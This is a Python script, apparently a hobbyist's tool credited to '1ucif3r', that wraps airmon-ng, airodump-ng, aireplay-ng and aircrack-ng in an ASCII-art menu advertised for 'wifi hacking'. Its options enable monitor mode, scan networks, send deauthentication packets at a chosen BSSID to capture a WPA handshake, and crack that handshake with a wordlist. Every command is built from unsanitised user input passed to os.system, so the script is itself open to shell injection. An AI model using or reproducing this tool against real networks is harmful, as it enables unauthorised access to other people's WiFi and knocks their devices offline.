
# coding: utf-8
#!/usr/bin/env python
import os
import subprocess
from subprocess import check_call
from sys import argv
from genericpath import isfile
from traceback import print_tb
from pystyle import *
import pytz
cmd  = os.system("clear")


lucifer = r'''
    BY :
 ▄█       ███    █▄   ▄████████  ▄█     ▄████████    ▄████████    ▄████████ 
███       ███    ███ ███    ███ ███    ███    ███   ███    ███   ███    ███ 
███       ███    ███ ███    █▀  ███▌   ███    █▀    ███    █▀    ███    ███ 
███       ███    ███ ███        ███▌  ▄███▄▄▄      ▄███▄▄▄      ▄███▄▄▄▄██▀ 
███       ███    ███ ███        ███▌ ▀▀███▀▀▀     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
███       ███    ███ ███    █▄  ███    ███          ███    █▄  ▀███████████ 
███▌    ▄ ███    ███ ███    ███ ███    ███          ███    ███   ███    ███ 
█████▄▄██ ████████▀  ████████▀  █▀     ███          ██████████   ███    ███ 
▀                                                                ███    ███ 

		     instagram.com/0x1ucif3r
                                                    
 
'''

System.Size(140, 40)
System.Title("AirCrackAuto")
System.Clear()
Anime.Fade(Center.Center(lucifer), Colors.red_to_green, Colorate.Vertical, interval=0.025, enter=True)



def intro():
    cmd  = os.system("clear")
    print("""
\033[94m                      |,
\033[94m     |,              y@@g,             ;|
\033[94m      "@@@g,       |g@@@@@|       ,gg@@"
\033[94m      ']@@@@@@@|  |@@@T|@@@|  |g@@@@@@P'
\033[94m       |]@@$"*B@@g@@@g@@@%@@g@@@$]C@@@|\033[0m\033[91m                                          \033[0m   
\033[94m        |%@@|  "B@@@@@P]@@@@@@`   $@@ \033[0m\033[91m ▄▄▄· ▪  ▄▄▄   ▄▄· ▄▄▄   ▄▄▄·  ▄▄· ▄ •▄    \033[0m
\033[94m         '$@K    %@@@"  ]@@@@   |j@@` \033[0m\033[91m▐█ ▀█ ██ ▀▄ █·▐█ ▌▪▀▄ █·▐█ ▀█ ▐█ ▌▪█▌▄▌▪   \033[0m
\033[94m          "@@     $@"    'B@   |j@@`` \033[0m\033[91m▄█▀▀█ ▐█·▐▀▀▄ ██ ▄▄▐▀▀▄ ▄█▀▀█ ██ ▄▄▐▀▀▄·   \033[0m
\033[94m          ']@@p|  %   ||  -K  ||@@P'  \033[0m\033[91m▐█ ▪▐▌▐█▌▐█•█▌▐███▌▐█•█▌▐█ ▪▐▌▐███▌▐█.█▌   \033[0m
\033[94m          |g@@@,|    |@@|    |`@@@N|  \033[0m\033[91m ▀  ▀ ▀▀▀.▀  ▀·▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀ ·▀  ▀   \033[0m
\033[94m         |@@@@@@@@g, $@@@||)g@N@@@@@  \033[0m\033[92m           By © 1ucif3r | 2022             \033[0m
\033[94m       '"*B@@@g@@@@@@@@@@@@@N$@@@@M"' \033[0m\033[92m    A Automate script for wifi hacking     \033[0m
\033[94m          '|*%@@@@$%NT|N$$@@@@N" '    \033[0m\033[92m                  v2.0                     \033[0m
\033[94m              `'"%@@@@@@@@@@M|'`
\033[94m                  '|"N@@@"''
\033[94m                     ` '`
     
                           
                                                             
    [1]-->Start monitor mode       
    [2]-->Stop monitor mode                        
    [3]-->Scan Networks                            
    [4]-->Getting Handshake(Need Monitor mode)                      
    [5]-->Crack Handshake with wordlist(Handshake needed)                                     

    [0]-->About Me
    [00]-->Exit

""")
    print(f'''\x1b[38;2;245;2;2m[root@aircrackauto] ''')
    var = int(input(""))
    if var == 1 :
        print("\nEnter the interface:(Default(wlan0/wlan1))")
        interface = input("")
        order = "airmon-ng start {} && airmon-ng check kill".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 2 :
        print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
        interface = input("")
        order = "airmon-ng stop {} && service network-manager restart".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 3 :
        print("\nEnter the interface:(Default >> (wlan0mon/wlan1mon))")
        interface = input("")
        order = "airodump-ng {} -M".format(interface)
        print("When Done Press CTRL+c")
        cmd = os.system("sleep 3")
        geny  = os.system(order)
        cmd = os.system("sleep 10")
        intro()
    elif var == 4 :
        print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
        interface = input("")
        order     = "airodump-ng {} -M".format(interface)
        print("\nWhen Done Press CTRL+c")
        print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")
        print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")
        print("\nyou Can use 's' to arrange networks")
        cmd       = os.system("sleep 7")
        geny      = os.system(order)
        print("\nEnter the bssid of the target?")
        bssid     = str(input(""))
        print("\nEnter the channel of the network?")
        channel   = int(input())
        print("Enter the path of the output file ?")
        path = str(input(""))
        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
        print("the number of the packets Depends on the Distance Between you and the network")
        dist = int(input(""))
        order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)
        geny = os.system(order)
        intro()
    
    elif var == 0 :
        cmd = os.system("clear")
        print("""
              

          ]@                                                               ,$@'
          ]@@g                                                           ,@@@@
           %$$&Ng                                                     ,g@@$@@
           g@@@|*&$Nw,          ,g@@NM$$$gwwggg$$$$N@@gg,        ,g@N$W$|@$@g
            %@$M@ljg$$@$MNmgg@@M$l&@]N@@@@@@$$$$$@M$@@$@$@@gg@NM$@g$grl@M$&@`
            ,]@$@@L,*&MM|'"MW/$@@@@%@@@@@@@@@@@@@@@@R@$$$@}gM"'lMM$M,;@&$@Mg@`
            "$@$MM@,,jp@$%%"']Q@@@@@$@Mll$$$$@$$$%@$$@@@@P$""%%$$g@,,@MM$%@C
            w$&N@$@@gw;"$g|$,#U@@@@@l$$$$$$$$@@@@$@$@@@@@U@,ll$@*},y@@$$@$Lw
              *%@@$MMNN&R&$$L]W$@@M$$@$$$$$$$@@@@$@@$@@@@V@l$$@RN&NM$$$@@M`
                "&$@@gg,,$@&$L%,%@$$$P%$$$$@@@@$@P$@@@@@,@,$@B$,,lg@@@$"
                   *%@@$$|L]M&$]$@@@$@g@Ng$@$$@N@g@@$@@@[l&M@,l$$$@M'
                     *M%@@@@@@$@g@#@$$$%$ll$$$$$$$$$$$@Wl$@@@@@@MM*
                        $@@$$$@@@@@&@k"*N$$$$@@N*'g$$@@@@@@$$$@@\033[0m\033[91m                                           \033[0m 
                        '%@@@$@@@@@@@$@"        "$@@@@$@@$@@$$@F\033[0m\033[91m (                  (    (          (     \033[0m
                         ]@@@@j@@@@@@@@@Ng,,,,gg@@@@@@@@@$$$$@F \033[0m\033[91m )\ )          (    )\ ) )\ )       )\ )  \033[0m
                           %@@@l%@@l$$@@T%@M$T%@]$l$$@@@$@$$@F  \033[0m\033[91m(()/(    (     )\  (()/((()/(  (   (()/(  \033[0m
                           %@@@$$@@@@$@$$$@$@@@$@@$@@@$@$$@,,   \033[0m\033[91m /(_))   )\  (((_)  /(_))/(_)) )\   /(_)) \033[0m
                            $@@P*$@NN@@@@@@@@@@@@@@@NNNNNPP     \033[0m\033[91m(_))  _ ((_) )\___ (_)) (_))_|((_) (_))   \033[0m
                             @P $@F @ ,,,]L $  ,,,@ ,gggP       \033[0m\033[91m| |  | | | |((/ __||_ _|| |_  | __|| _ \  \033[0m
                                 @ww@,]@@@L,$,,,,]@gwgg         \033[0m\033[91m| |__| |_| | | (__  | | | __| | _| |   /  \033[0m
                                    $l'""]@T$lj@@@@l`'          \033[0m\033[91m|____|\___/   \___||___||_|   |___||_|_\  \033[0m    
                                       @@@@@@@@@@@
                                        "MN@@@BM
                                                
                                                              
\033[0m\033[92m          [!] Instagram : https://www.instagram.com/0x1ucif3r/     \033[0m
\033[0m\033[92m          [!] Website : https://1ucif3r.me/                        \033[0m
\033[0m\033[92m          [!] Github : https://github.com/1ucif3r                  \033[0m
\033[0m\033[92m          [!] DARK4RMY : https://dark4rmy.in/                      \033[0m

""")
        quit()
    elif var == 00:
        exit()
    
    elif var == 5 :
        print("\nEnter the path of the handshake file ?")
        path = str(input(""))
        print("\nEnter the path of the wordlist ?")
        wordlist = str(input(""))
        order = ("aircrack-ng {} -w {}").format(path,wordlist)
        geny = os.system(order)
        exit()
    
    
    else:
        print("Not Found")
        cmd = os.system("sleep 2")
        intro()
intro()
